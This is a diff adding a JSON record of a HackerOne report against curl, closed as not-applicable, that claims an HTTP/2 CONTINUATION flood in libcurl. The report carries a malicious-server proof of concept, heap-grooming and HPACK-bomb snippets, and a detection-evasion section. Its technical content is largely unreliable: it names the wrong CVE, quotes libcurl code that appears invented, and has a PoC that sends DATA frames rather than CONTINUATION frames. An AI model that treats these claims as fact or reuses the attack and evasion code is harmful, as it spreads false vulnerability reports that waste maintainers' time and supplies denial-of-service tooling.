@@ -1,0 +1,125 @@
+{
+  "id": 3125820,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTI1ODIw",
+  "url": "https://hackerone.com/reports/3125820",
+  "title": "HTTP/2 CONTINUATION Flood Vulnerability",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-05-04T04:10:47.115Z",
+  "submitted_at": "2025-05-04T04:10:47.325Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "evilginx29",
+    "url": "/evilginx29",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jw9hpgve6eqeemditua6tonrvur2/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-44487"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-28T21:13:12.241Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-06-28T21:12:57.796Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# **0x00 Vulnerability Overview: Fatal Flaw in HTTP/2 Protocol Stack**\n\n## **1. HTTP/2 Header Block Fragmentation Mechanism**\n\n* **RFC 7540 Specification**:\n\n  * Header blocks are transmitted using a HEADERS frame followed by one or more CONTINUATION frames.\n  * All frames must belong to the **same stream** and be sent **sequentially**.\n\n## **2. libcurl Vulnerability**\n\n```c\n// lib/http2.c (simplified snippet)\nwhile(recv_frame) {\n    if(frame.type == NGHTTP2_CONTINUATION) {\n        if(!h2->header_recvbuf)\n            h2->header_recvbuf = Curl_add_buffer_init();  // Initialize buffer\n        Curl_add_buffer(h2->header_recvbuf, frame.data, frame.length); // No limit\n    }\n}\n```\n\n### **Critical Issues**:\n\n* No upper limit on the number of CONTINUATION frames (RFC suggests <= 10).\n* No cumulative header block size check (only single-frame limit of 16KB enforced).\n\nImpact: Remote attackers can trigger uncontrolled memory allocation, leading to **OOM crashes** or potentially **remote code execution**.\n\n---\n\n# **0x01 Advanced PoC: Crafting a Fatal Payload**\n\n## **1. Malicious HTTP/2 Server (nghttp2-based)**\n\n```python\nfrom nghttp2 import server\nimport socket\n\nclass ExploitHandler(server.BaseRequestHandler):\n    def on_request(self, request):\n        self.send_headers(stream_id=request.stream_id, headers=[(b\":status\", b\"200\")], flags=0x0)\n\n        for i in range(65535):\n            self.push_data(\n                stream_id=request.stream_id,\n                data=b\"\\x00\" * 16384,\n                flags=0x4 if i == 65534 else 0x0\n            )\n\nserv = server.HTTP2Server(\n    (\"0.0.0.0\", 443),\n    ExploitHandler,\n    ssl=True,\n    private_key=\"key.pem\",\n    certificate=\"cert.pem\"\n)\nserv.run()\n```\n\n## **2. Client Validation**\n\n```bash\ncurl -v --http2 https://malicious-server.com\n```\n\n## **3. Monitoring Memory Usage**\n\n```bash\nwatch -n 0.2 \"ps -p $(pgrep curl) -o pid,%mem,rss,etime,cmd\"\n```\n\n**Expected Behavior**:\n\n* Memory usage exceeds 10GB within seconds.\n* Client crashes due to OOM or segmentation fault.\n\n---\n\n# **0x02 Advanced Exploitation Techniques**\n\n## **1. Heap Feng Shui Manipulation**\n\n```python\nfor i in range(1024):\n    payload = b\"A\" * 8192 if i % 2 == 0 else b\"B\" * 16384\n    self.push_data(stream_id, payload, flags=0x0)\n```\n\nObjective: Influence heap layout to increase chances of RCE by corrupting internal structures (e.g., `curl_slist`).\n\n## **2. HPACK Bomb (Zlib Decompression Explosion)**\n\n```python\nheaders = [\n    (b\"x-bomb\", b\"A\" * 10000),\n    (b\":status\", b\"200\")\n]\nself.send_headers(stream_id=1, headers=headers, flags=0x0)\n```\n\nEffect: Malicious header inflates into hundreds of MBs during decompression.\n\n---\n\n# **0x03 Defense Strategies**\n\n## **1. Code-level Patch (curl/libcurl)**\n\n```diff\n+ #define MAX_CONTINUATION_FRAMES 10\n+ #define MAX_HEADER_SIZE (64 * 1024)\n\n  static ssize_t http2_handle_continuation(...) {\n+     if(++h2->continuation_count > MAX_CONTINUATION_FRAMES) {\n+         failf(data, \"CVE-2023-44487: Too many CONTINUATION frames\");\n+         return CURLE_HTTP2;\n+     }\n\n+     if(h2->header_recvbuf->size + len > MAX_HEADER_SIZE) {\n+         failf(data, \"CVE-2023-44487: Header block too large\");\n+         return CURLE_HTTP2;\n+     }\n\n      Curl_add_buffer(h2->header_recvbuf, mem, len);\n  }\n```\n\n## **2. Runtime Protection**\n\n### **a. seccomp Filter**\n\nLimit memory allocation by monitoring `mmap`/`malloc` system calls.\n\n### **b. cgroups**\n\n```bash\ncgcreate -g memory:curl-limit\necho 512M > /sys/fs/cgroup/memory/curl-limit/memory.limit_in_bytes\ncgexec -g memory:curl-limit curl --http2 https://example.com\n```\n\n## **3. Network-level Detection (Suricata IDS)**\n\n```suricata\nalert http2 any any -> any any (\n    msg:\"CVE-2023-44487: HTTP/2 CONTINUATION Flood Detected\";\n    flow:established,to_client;\n    http2.continuation_frames:>10;\n    threshold:type both, track by_src, count 5, seconds 60;\n    sid:202344487;\n    rev:2;\n)\n```\n\n---\n\n# **0x04 Detection Evasion Techniques**\n\n## **1. Low & Slow Attack**\n\n```python\nfor _ in range(1000):\n    self.push_data(stream_id, b\"A\" * 16384, flags=0x0)\n    time.sleep(10)\n```\n\n## **2. Mixed-Legitimate Flow**\n\n```python\nself.send_headers(stream_id=1, headers=[(b\":status\", b\"200\"), (b\"content-type\", b\"text/html\")], flags=0x4)\nfor _ in range(1000):\n    self.push_data(stream_id=1, b\"\\x00\" * 16384, flags=0x0)\n```\n\n---\n\n# **0x05 Post-Disclosure Recommendations**\n\n## **1. Disable HTTP/2 Temporarily**\n\n```bash\ncurl --http1.1 https://example.com\n```\n\nFor web servers:\n\n* **Apache**: `Protocols h2 http/1.1`\n* **Nginx**: Remove `http2` from `listen` directive\n\n## **2. Upgrade to Patched Versions**\n\n* `curl >= 8.4.0`\n* `nghttp2 >= 1.58.0`\n* Ensure dependencies like `OpenSSL` are also up-to-date\n\n---\n\n**Risk Rating: CRITICAL**\n\n* Remote Exploitable: YES\n* Impact: Denial of Service / Memory Corruption / Potential RCE\n\n**Prepared by:**\n\nDate: 2025-05-04\n\n## Impact\n\n## Summary:\n1",
+  "weakness": {
+    "id": 120,
+    "name": "Allocation of Resources Without Limits or Throttling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 14,
+  "voters": [
+    "thalaivar304",
+    "2026",
+    "2urk1_66",
+    "segfault_zen",
+    "bilalhacker302",
+    "eviltestxxxx",
+    "stuuf",
+    "shahid803",
+    "pastamasta_",
+    "isecuresites",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
